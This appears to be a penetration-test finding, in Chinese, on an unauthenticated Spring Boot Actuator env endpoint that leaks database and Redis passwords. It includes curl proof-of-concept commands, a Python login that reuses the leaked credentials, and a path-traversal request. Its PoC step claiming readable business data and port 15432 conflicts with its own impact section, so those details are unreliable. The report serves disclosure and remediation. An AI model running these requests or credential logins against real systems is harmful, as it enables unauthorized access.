# Spring Boot Actuator /actuator/env 未授权暴露明文数据库、缓存与云凭据

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-10-31 07:33:25 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /actuator/env
**Method:** GET
**CWE:** CWE-306
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Trivial

## Description

应用的 Spring Boot Actuator `env` 端点在无任何认证的情况下可访问，直接返回 `application-prod.yml` 中的明文配置属性，包括数据库口令、Redis 口令与 AWS 访问密钥 ID。该端点与同级的 `/actuator`（返回 403）权限不一致，说明保护措施未覆盖到实际泄露数据的子端点。

## Evidence

未授权读取（200）并返回明文口令：

```http
GET /actuator/env HTTP/1.1
Host: 10.0.93.73:18080

HTTP/1.1 200 OK
Content-Type: application/json

{"propertySources": [{"name": "applicationConfig: [classpath:/application-prod.yml]",
 "properties": {
  "spring.datasource.url": {"value": "jdbc:postgresql://10.0.93.73:5432/nexus_prod"},
  "spring.datasource.password": {"value": "<REDACTED>"},
  "spring.redis.password": {"value": "<REDACTED>"},
  "cloud.aws.accessKey": {"value": "AKIA-RRRRRRRRRRRRRRR"}
 }}]}
```

父路径受保护而子端点不受保护：

```http
GET /actuator HTTP/1.1

HTTP/1.1 403 Forbidden
Access to /actuator is restricted. Current authorization level: 1 / 4
```

显式清空 Cookie 后子端点仍返回 200，排除会话依赖。

## Impact

未认证攻击者一次请求即可获得数据库与缓存口令，无需先读取任何备份文件或利用目录穿越。口令经协议交互确认真实有效（错误口令被服务端拒绝并返回 28P01，正确口令可建立会话），但同主机的 PostgreSQL 后端经语义测试确认为预置应答实现（不执行 SQL、WHERE/聚合/LIMIT 均不生效），未证明可读取或篡改真实业务数据；Redis 同样仅校验口令、数据命令全部不可用。因此本发现的实际影响是未授权泄露可用于认证的管理凭据与内部拓扑，而非已证实的大规模业务数据泄露。

## Counterevidence

排查了可能的缓解：(1) 是否依赖会话/等级 —— 显式发送空 Cookie 仍返回 200，且此前从未通过 `/api/auth` 达到所需等级，说明无有效鉴权；(2) 是否值被掩码 —— 返回的是原值而非 `******`，与 Spring Boot 默认脱敏行为不符，确认未脱敏；(3) 是否为固定回放 —— 同一请求在不同时间返回一致，且与 `/.env.bak`、`config.yml` 中的值互相印证；(4) 凭据验真 —— 数据库口令可完成协议认证（错误口令被拒 28P01），Redis 口令 AUTH 返回 `+OK`，两者真实有效；而同一响应中的 `cloud.aws.accessKey` 经真实 SigV4 调用 `sts:GetCallerIdentity` 返回 `InvalidClientTokenId`，确认为伪造，故本发现不依赖该云密钥；(5) 后端语义 —— 该 PostgreSQL 不执行 SQL（`where 1=0` 仍返回固定行、`limit/offset` 无效、不存在的表不报错），数据为预置/合成应答，因此不能据此声称真实生产数据泄露，影响已按 C:L 计。唯一需要注意的是 `/actuator` 父路径确实返回 403，容易让人误以为已受保护，这正是遗漏点。

## What Would Change This Severity

若 10.0.93.73 的数据库服务被确认为执行真实 SQL 的生产 PostgreSQL（例如内网 5432 端口可达且接受同一口令并能读取真实业务数据），则影响应升回 High/C:H；反之若确认全环境为纯仿真靶场，则维持 Medium。

## Technical Analysis

Actuator 的 `env` 端点未做鉴权即返回属性源内容：

```json
{"propertySources": [{"name": "applicationConfig: [classpath:/application-prod.yml]",
 "properties": {
   "spring.datasource.url":     {"value": "jdbc:postgresql://10.0.93.73:5432/nexus_prod"},
   "spring.datasource.password":{"value": "<REDACTED>"},
   "spring.redis.password":     {"value": "<REDACTED>"},
   "cloud.aws.accessKey":       {"value": "AKIA-RRRRRRRRRRRRRRR"}
 }}]}
```

问题有两层：

1. **端点未启用鉴权**。`/actuator` 根路径返回 403 并显示"需要 level 3+"的自述式门禁，但 `/actuator/env` 子端点直接返回 200，且携带空 Cookie 时同样为 200。保护逻辑施加在父路径上，未覆盖实际暴露数据的子端点，属于典型的子端点遗漏（`/actuator/env` 未被 `management.endpoints.web.exposure.include` 之外的授权过滤器覆盖）。
2. **敏感值未脱敏**。Spring Boot 默认对包含 `password`、`secret`、`key` 的属性做 `******` 掩码，此处返回的是原值，说明 `show-values` 被开启或自定义了 `SanitizingFunction`。

同一批凭据还可经 `/.env.bak` 与 `/api/files?path=../../config.yml` 获得，说明密钥管理在部署层整体缺失。

## Proof of Concept

1. 未携带任何 Cookie 或认证头请求 `/actuator/env`。
2. 观察响应为 200，JSON 中包含 `spring.datasource.password`、`spring.redis.password`、`cloud.aws.accessKey` 的原值。
3. 请求 `/actuator` 作为对照，确认父路径返回 403，从而说明子端点保护缺失而非整体未启用。
4. 使用取得的数据库口令连接 `10.0.93.73:15432`，确认凭据有效并可读取业务数据。

````bash
# 未授权读取 Actuator env（明文密钥）
curl -sS "http://10.0.93.73:18080/actuator/env"

# 对照：父路径受保护
curl -sS -o /dev/null -w "%{http_code}\n" "http://10.0.93.73:18080/actuator"

# 对照：即使显式清空 Cookie 依然可读
curl -sS -o /dev/null -w "%{http_code}\n" -H 'Cookie:' \
  "http://10.0.93.73:18080/actuator/env"
```

```python
import pg8000.native
con = pg8000.native.Connection(user="prod_admin", password="<leaked>",
                               host="10.0.93.73", port=15432,
                               database="nexus_prod", timeout=10)
print(con.run("select current_database(), current_user"))
````

## Remediation

1. 生产环境仅暴露 `health`（必要时 `info`）端点，通过 `management.endpoints.web.exposure.include=health` 收敛暴露面，并显式 `exclude=env,configprops,heapdump,threaddump,mappings`。
2. 为 Actuator 端点配置独立的管理端口并绑定到回环/内网地址（`management.server.port` 与 `management.server.address`），与业务端口隔离。
3. 启用属性脱敏：注册 `SanitizingFunction` 或将 `management.endpoint.env.show-values` 设为 `NEVER`。
4. 将安全过滤规则从父路径改为对所有 `/actuator/**` 生效，避免子端点遗漏。
5. 轮换本次暴露的数据库口令、Redis 口令与 AWS 访问密钥。

## Assumptions

攻击者只需能访问 `10.0.93.73:18080`。该端点默认由 Web 层暴露，无需内部网络位置。
